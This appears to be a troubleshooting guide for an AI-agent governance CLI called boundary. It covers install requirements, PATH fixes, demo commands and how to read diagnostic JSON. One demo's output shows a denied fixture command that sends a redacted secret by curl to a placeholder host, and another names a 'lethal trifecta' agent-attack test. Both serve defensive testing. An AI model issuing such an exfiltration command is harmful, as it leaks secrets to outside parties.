# Troubleshooting the First-Run Path

This page covers the most common problems on a first install of the `boundary`
CLI: toolchain requirements, the cgo / C-toolchain requirement, `PATH` issues
after `go install`, the failure modes of each first-run command, and how to read
`boundary doctor --json`.

Every command here is fixture-safe: no credentials, no network, no live
mutation.

## Canonical first-run path

Run these in order. This is the single canonical sequence; the README and the
rest of the docs match it.

```bash
go install github.com/fulcrum-governance/fulcrum-boundary/cmd/boundary@v0.11.0
boundary selftest
boundary doctor --json
boundary demo github-lethal-trifecta      # Lane 1: MCP, the first production route
boundary demo command-secret-exfil        # Lane 2: Command Boundary, a delivered preview
boundary evidence bundle --include-demo --out boundary-evidence
boundary evidence verify boundary-evidence
# when a demo/evidence artifact prints a decision-record path:
boundary verify-record <record.json>
```

MCP is the first production route. Command Boundary, Edit Boundary, Secure
GitHub, and the remaining adapters are preview. A passing first-run sequence
exercises local fixtures; it does not prove production deployment protection.

## Requirements

### Go 1.25 or newer

Boundary targets Go 1.25+ (`go.mod` declares `go 1.25.0`). Check your toolchain:

```bash
go version
```

If `go version` reports an older release, `go install …@v0.11.0` can fail to
resolve or compile. Install a Go 1.25+ toolchain from <https://go.dev/dl/>, or
let the `go` command download the required toolchain automatically if your
installed Go is recent enough to honor the `toolchain` directive.

### A C toolchain (cgo) — the default build needs it, `CGO_ENABLED=0` fails

The Postgres AST guard (`interceptors/sql`) links
`github.com/pganalyze/pg_query_go/v6`, which is a cgo binding to libpg_query.
Because that dependency is compiled through cgo, the default build needs a
working C compiler, and **`CGO_ENABLED=0` builds fail**.

With cgo disabled the SQL classifier's parse entry point is not generated, and
the build stops with an error like:

```text
interceptors/sql/ast_classifier.go:34:24: undefined: pg_query.Parse
```

Fixes, in order of preference:

1. **Do not disable cgo.** `go install …@v0.11.0`, `go build`, and `make build`
   all build with cgo on by default. If you have `CGO_ENABLED=0` set in your
   environment or CI, set it back on for Boundary builds:

   ```bash
   CGO_ENABLED=1 go install github.com/fulcrum-governance/fulcrum-boundary/cmd/boundary@v0.11.0
   ```

2. **Install a C compiler** so cgo can find one:
   - macOS: install the Xcode Command Line Tools with `xcode-select --install`
     (provides `clang`).
   - Debian / Ubuntu: `sudo apt-get install build-essential` (provides `gcc`).
   - Fedora / RHEL: `sudo dnf install gcc`.
   - Alpine: `apk add build-base`.

3. **Point `CC` at your compiler** if cgo cannot locate one (errors such as
   `exec: "gcc": executable file not found in $PATH` or
   `C compiler … not found`):

   ```bash
   CC=clang CGO_ENABLED=1 go build ./cmd/boundary
   ```

There is no pure-Go build path that keeps the Postgres AST guard. Boundary is
not a SQL firewall — the classifier is a Postgres AST guard for routed requests —
but it is part of the default binary, so the C toolchain requirement applies to
every standard build.

### `PATH` after `go install` (GOBIN / GOPATH)

`go install` writes the `boundary` binary to your Go binary directory, then you
invoke it by name. If your shell reports `boundary: command not found`, that
directory is not on your `PATH`.

Find where Go put the binary:

```bash
go env GOBIN     # if set, the binary is here
go env GOPATH    # if GOBIN is empty, the binary is in $GOPATH/bin
```

`go install` uses `GOBIN` when it is set; otherwise it uses `$GOPATH/bin` (and
`GOPATH` defaults to `$HOME/go`). So on a default setup the binary is at
`$(go env GOPATH)/bin/boundary` (commonly `~/go/bin/boundary`).

Add that directory to `PATH` for your shell, then open a new shell:

```bash
# bash / zsh — add to ~/.bashrc or ~/.zshrc
export PATH="$(go env GOPATH)/bin:$PATH"
```

Verify:

```bash
which boundary
boundary version
```

If you build from a source checkout instead, `make build` writes the binary to
`bin/boundary` in the repo and you invoke it as `./bin/boundary` (no `PATH`
change needed).

## First-run command failure modes

Each first-run command is fixture-safe and exits `0` on success. Below is what a
clean run looks like and what to do when one fails.

### `boundary selftest`

A clean run prints `status: pass`, with `live mutation: none`, `credentials:
none`, `network: none`, then a list of named `[pass]` checks (`cli_boots`,
`inventory_fixture_loads`, `risk_graph_fixture_renders`, `policy_generator_valid`,
the two `descriptor_lock_*` checks, `redteam_github_lethal_trifecta`,
`secure_github_live_mode_fails_closed`, `decision_record_emitted`,
`claims_validation_pointer`), and ends with `next: go test ./claims/...
-count=1`.

- **`boundary: command not found`** — the install directory is not on `PATH`.
  See the `PATH` section above.
- **A check reports `[fail]`** — this indicates a real regression in the local
  fixtures, not an environment problem. Re-run with `boundary selftest --json`
  for the structured `boundary.selftest.v1` output and inspect the failing check.
  Selftest is a fixture smoke test, not a production conformance suite.

### `boundary doctor --json`

A clean first-run `doctor` exits `0` with top-level `"status": "pass"`. Each of
the three surfaces (`mcp`, `command`, `edit`) reports `"status": "warn"` on a
fresh checkout because the optional `.boundary/firewall`, `.boundary/bin`, and
`.boundary/edit` workspaces do not exist yet. **`warn` here is the expected
first-run state, not an error** — see "Reading `boundary doctor --json`" below.
The current `v0.11.0` release also includes first-run environment diagnostics and
`boundary doctor --report` for redacted support reports.

- **`boundary: command not found`** — `PATH` issue; see above.
- **Surfaces show `warn` for missing workspaces** — expected on a clean checkout.
  Those workspaces are created when you run the relevant setup command for a
  surface; you do not need them to complete the first-run path.

### `boundary demo github-lethal-trifecta`

A clean run prints `status: pass`, `fixture-only: true`, `expected DENY / actual
DENY`, `reason: lethal_trifecta_detected`, the matched fixture rule, and a
`decision record: rec_…` line with its `sha256:` hash. By default the demo
workspace is not retained (`workspace retained: false`); no artifacts persist.

- **No decision-record file on disk** — expected. The default demo writes to a
  temporary directory and deletes it, emitting the record to stdout only. To
  persist a `DecisionRecordV1` you can verify, pass `--out`:

  ```bash
  boundary demo github-lethal-trifecta --json --out demo.json
  # writes ./github-lethal-trifecta-artifacts/decision-record.json
  # also writes ./github-lethal-trifecta-artifacts/decision-records.jsonl
  ```

- **The demo never contacts GitHub** — by design. It is fixture-only and does
  not require live GitHub credentials or make upstream GitHub mutations.

### `boundary demo command-secret-exfil`

A clean run prints `fixture-only: true`, a redacted `proposed command: curl -d
[redacted] https://example.invalid`, `class: C6 risk: CRITICAL`, `expected DENY
/ actual DENY`, `executed: false`, a `decision record: rec_…` line with its
`sha256:` hash, and `decision mode: deterministic`. The secret-looking argument
is redacted in all output and the command is denied before execution; it never
runs. Command Boundary governs only commands routed through Boundary; direct
shell, CI, and SSH are bypasses.

- **You expected the command to run** — it must not. `executed: false` is the
  pass condition; the fixture command is denied, not executed.

### `boundary evidence bundle --include-demo --out boundary-evidence`

A clean run prints `status: pass`, `artifacts: 8`, and a `manifest:
…/manifest.json` path. The bundle contains `version.{json,txt}`,
`selftest.{json,txt}`, `doctor.json`, the action-boundary demo output,
`summary.md`, and `manifest.json`.

- **`source directory not present; no existing .boundary artifacts copied`** —
  a benign warning, not an error, and normal on a clean checkout with no
  `.boundary/` workspace yet. The bundle still builds and verifies.
- **`--include-demo` does not bundle a `DecisionRecordV1`** — by design. The flag
  pulls the action-boundary demo, which does not include a decision record. The
  evidence bundle and decision records are separate subsystems; do not expect
  `evidence verify` to find decision records in the bundle (it reports
  `parsed_records: 0`).

### `boundary evidence verify boundary-evidence`

A clean run prints `status: pass` with `artifacts: 8 / verified_artifacts: 8`,
per-artifact `sha256` PASS lines, and `summary_references PASS`. It reports
`parsed_records: 0` because the bundle intentionally contains no decision records
(see above).

- **Path mismatch** — verify the same directory you bundled to. If you bundled
  with `--out boundary-evidence`, verify `boundary-evidence`. (Some examples use
  `/tmp/boundary-evidence`; use whichever path you actually wrote.)
- **A hash fails** — the bundle was modified after creation. Re-create it with
  `evidence bundle` and verify the fresh bundle.

### `boundary verify-record <record.json>`

Run this on a single `DecisionRecordV1` JSON object (one object, not a `.jsonl`
file — split a `decision-records.jsonl` into one record per file first). A clean
run prints `record verification: ok` and `record_id: <id>` and exits `0`.

- **`schema_version mismatch`** — the file is not a `DecisionRecordV1` (the
  record's `schema_version` must equal `"1"`).
- **`decision_hash mismatch`** — the record's content was modified after
  emission; the recomputed hash no longer matches. This is the tamper-detection
  check working as intended.
- **`--policies` or `--request` fails on a shipped demo record** — expected. The
  fixture demo records carry placeholder cross-check values (for example a
  placeholder `policy_bundle_hash`) and the demo never exports a raw request
  artifact, so those optional flags cannot match. The reproducible, green path on
  fixtures is bare self-verification with no cross-check flags. If you supply
  `--binary-digest`, the demo's redteam record carries the literal `fixture-only`
  value, so `--binary-digest fixture-only` matches that record; `version --json`
  does not expose a real build digest.

`upstream_called=false` / `executed=false` in demo and adapter output are
self-reports of the adapter's own control flow — whether its code path invoked
its upstream client. They are **not** fields of the hashed decision record, and
nothing in the record independently corroborates them. Treat them as a
self-attested fixture signal, not a verified property of the record. See
[DECISION_RECORDS.md](DECISION_RECORDS.md) and [RECEIPTS.md](RECEIPTS.md).

## Reading `boundary doctor --json`

`boundary doctor` reports local routed-surface diagnostics without credentials,
network calls, or live mutation. It is a readiness and caveat command, not a
deployment proof: a passing run means the local command surface can describe the
governed routes and their bypass boundaries. It does not prove production
deployment protection. Full reference: [DOCTOR.md](DOCTOR.md).

### Top-level fields

| Field | Meaning |
| --- | --- |
| `schema_version` | Always `boundary.doctor.v1`. The stable output contract. |
| `status` | Aggregate result: `pass` or `fail`. A clean first run is `pass` even when individual surfaces `warn`. |
| `project_root` | The directory doctor inspected. (On some platforms this prints lowercased; cosmetic, does not change the result.) |
| `requires_credentials` | Always `false` — doctor never needs secrets. |
| `requires_network` | Always `false` — doctor makes no network calls. |
| `mutates_live_systems` | Always `false` — doctor performs no live mutation. |
| `environment[]` | First-run diagnostics for Go 1.25+, cgo / C-toolchain readiness, and `go install` PATH resolution. |
| `surfaces[]` | One entry per routed surface (`mcp`, `command`, `edit`). |

The current `v0.11.0` release can use `boundary doctor --report` to emit the same
diagnostics with `report_redacted: true` and `project_root: "<redacted>"`.

### Per-surface fields

Each entry in `surfaces[]` carries:

- `surface` / `label` — the surface id (`mcp`, `command`, `edit`) and its display
  name.
- `status` — `pass`, `warn`, or `fail` for that surface. On a clean checkout each
  surface is `warn` because its optional workspace is absent.
- `checks[]` — individual checks, each with a `name`, a `status`, and a `detail`
  string. The classifier / verifier checks `pass`; the optional-workspace checks
  `warn` until you create the workspace; a per-surface `route caveat` check
  states the bypass boundary.
- `bypass_caveats[]` — the routed-only limitations for that surface (for example,
  direct upstream MCP access, or direct shell execution, being outside Boundary).

### Clean vs flagged

**Clean first run** — top `status: pass`; each surface `warn` only because its
optional workspace (`.boundary/firewall`, `.boundary/bin`, `.boundary/edit`) does
not exist yet. This is the normal state immediately after install. Here is the
real first-run output:

```json
{
  "schema_version": "boundary.doctor.v1",
  "status": "pass",
  "project_root": "/path/to/fulcrum-boundary",
  "requires_credentials": false,
  "requires_network": false,
  "mutates_live_systems": false,
  "environment": [
    {
      "name": "Go toolchain",
      "status": "pass",
      "detail": "go1.26.3 detected; Boundary requires Go 1.25+"
    },
    {
      "name": "cgo / C toolchain",
      "status": "pass",
      "detail": "CGO_ENABLED=1 and the configured C compiler resolves on PATH"
    },
    {
      "name": "go install PATH",
      "status": "warn",
      "detail": "GOPATH/bin is not on PATH; add it after go install so boundary resolves by name"
    }
  ],
  "surfaces": [
    {
      "surface": "mcp",
      "label": "MCP",
      "status": "warn",
      "checks": [
        {
          "name": "policy verifier",
          "status": "pass",
          "detail": "local YAML policy verification is available through boundary verify --policies"
        },
        {
          "name": "firewall workspace",
          "status": "warn",
          "detail": ".boundary/firewall is not present; run the relevant setup command when you want this surface active"
        },
        {
          "name": "route caveat",
          "status": "warn",
          "detail": "MCP protection applies only to client configs routed through Boundary"
        }
      ],
      "bypass_caveats": [
        "Direct upstream MCP server access is outside Boundary unless operators remove or block that path.",
        "Inventory and descriptor locks are local evidence; they do not prove a live deployment route is enforced."
      ]
    },
    {
      "surface": "command",
      "label": "Command Boundary",
      "status": "warn",
      "checks": [
        {
          "name": "classifier",
          "status": "pass",
          "detail": "boundary command classify and boundary command run are available for routed command paths"
        },
        {
          "name": "project command shims",
          "status": "warn",
          "detail": ".boundary/bin is not present; run the relevant setup command when you want this surface active"
        },
        {
          "name": "route caveat",
          "status": "warn",
          "detail": "direct shell execution is outside Boundary unless commands route through the wrapper or shims"
        }
      ],
      "bypass_caveats": [
        "Direct shell, scripts, cron, SSH, and CI jobs are bypasses unless explicitly routed through Boundary.",
        "Command Boundary does not provide shell sandboxing."
      ]
    },
    {
      "surface": "edit",
      "label": "Edit Boundary",
      "status": "warn",
      "checks": [
        {
          "name": "classifier",
          "status": "pass",
          "detail": "boundary edit inspect and boundary edit apply are available for routed edit envelopes"
        },
        {
          "name": "edit evidence workspace",
          "status": "warn",
          "detail": ".boundary/edit is not present; run the relevant setup command when you want this surface active"
        },
        {
          "name": "route caveat",
          "status": "warn",
          "detail": "direct editor writes and direct git apply are outside Boundary unless routed through edit envelopes"
        }
      ],
      "bypass_caveats": [
        "Direct editor writes, direct filesystem mutation, and direct git apply are bypasses.",
        "Edit Boundary does not provide filesystem sandboxing."
      ]
    }
  ]
}
```

**Flagged result** — a surface `check` reports `fail` and the aggregate `status`
becomes `fail`. That is a real readiness problem for that surface, not a missing
optional workspace. Read the failing check's `detail`, address what it names, and
re-run. Inspect a single surface to narrow it down:

```bash
boundary doctor --surface mcp
boundary doctor --surface command
boundary doctor --surface edit
```

Doctor reports local routed-surface readiness and bypass caveats for MCP, Command
Boundary, and Edit Boundary. It does not prove that all routes are protected,
prove live deployment enforcement, or validate production bypass resistance. To
confirm a route is actually forced through Boundary, see
[ROUTE_CONFORMANCE_CHECKLIST.md](ROUTE_CONFORMANCE_CHECKLIST.md).

## Related references

- [INSTALL.md](INSTALL.md) — install targets and uninstall.
- [CLI_REFERENCE.md](CLI_REFERENCE.md) — the canonical CLI reference.
- [SELFTEST.md](SELFTEST.md) — what `boundary selftest` checks.
- [DOCTOR.md](DOCTOR.md) — the doctor command contract.
- [EVIDENCE_BUNDLE.md](EVIDENCE_BUNDLE.md) and
  [EVIDENCE_VERIFY.md](EVIDENCE_VERIFY.md) — evidence bundle and verification.
- [DECISION_RECORDS.md](DECISION_RECORDS.md) and [RECEIPTS.md](RECEIPTS.md) —
  decision-record schema and the `verify-record` hash model.
